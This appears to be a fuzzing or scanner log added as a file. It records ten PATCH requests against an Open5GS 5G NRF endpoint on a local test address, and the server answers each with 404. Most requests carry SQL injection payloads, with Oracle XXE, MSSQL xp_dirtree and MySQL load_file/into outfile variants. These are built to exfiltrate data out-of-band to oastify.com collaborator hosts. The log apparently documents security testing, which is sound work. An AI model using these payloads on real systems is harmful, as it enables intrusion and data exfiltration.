@@ -1,0 +1,251 @@
+
+Request Number 1
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20mbvlf%20SYSTEM%20%22http%3a%2f%2fm7u4n6dkigvox8dok18i8mx7uy0p2ds1vppcf04.oasti'%7c%7c'fy.com%2f%22%3e%25mbvlf%3b]%3e')%2c'%2fl')%20from%20dual)=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 2
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20mbvlf%20SYSTEM%20%22http%3a%2f%2f6qxo6qw410e8gsw83lr2r6grdij9lxblf99wzko.oasti'%7c%7c'fy.com%2f%22%3e%25mbvlf%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 3
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clnc335tjyfbnd7tn00ohold6axgoic80zqnkaayz.oasti'%2b'fy.com%5czcd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 4
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cpe77u9knpj2r4bkrr4flfp4a117s9gz4qvep1fp4.oasti'%2b'fy.com%5cnqn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 5
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5clg53w5mjrf4n67mnt0hhhl663x9obc10ssgm3cr1.oasti'%2b'fy.com%5chjw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 6
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnlc517rlwh9pb9rpy2mjmnb88zeqge62xvlp8fw4.oasti'%2b'fy.com%5cnyp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 7
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?(select%20load_file('%5c%5c%5c%5cizl0f25gacnkp45kcx0e0ip3muslu9kxbzztmja8.oastify.com%5c%5ciod'))=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 8
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'%2b(select%20load_file('%5c%5c%5c%5c0z0ifk5yaun2pm52cf0w00plmcs3urkfbizcm2ar.oastify.com%5c%5cnrc'))%2b'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 9
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1%20into%20outfile%20'%5c%5c%5c%5cr4w9kbapflstudath65n5rucr3xuzip6ga44rufj.oastify.com%5c%5cmnf'%3b%20--%20=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
+Request Number 10
+
+PATCH http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/{nfInstanceID}?1'=1
+Host: 127.0.0.10
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+If-Match: {value}
+
+------------------------------------------------------------
+{'content-length': '140',
+ 'content-type': 'application/problem+json',
+ 'date': 'Sun, 02 Apr 2023 18:53:23 GMT',
+ 'server': 'Open5GS v2.4.11-17-g0daef16'}
+--------------------
+{
+	"type":	"/nnrf-nfm/v1",
+	"title":	"Not found",
+	"status":	404,
+	"detail":	"{nfInstanceID}",
+	"instance":	"/nf-instances/{nfInstanceID}"
+}
+========================================================================================================================
+
